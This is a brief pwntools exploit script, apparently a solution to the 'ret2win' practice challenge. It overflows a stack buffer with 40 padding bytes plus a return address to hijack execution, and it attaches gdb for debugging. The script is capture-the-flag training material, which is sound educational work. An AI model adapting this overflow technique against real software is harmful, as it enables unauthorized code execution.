#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

local = 1
if local:
	p = process('./ret2win')
else:
	p = remote()

ret2win = 0x400811

gdb.attach(p, 'b 0x40080f')

payload = cyclic(0x32)
payload = 'A' * 40 + p64(ret2win)
p.recvuntil('> ')
p.sendline(payload)

p.interactive()
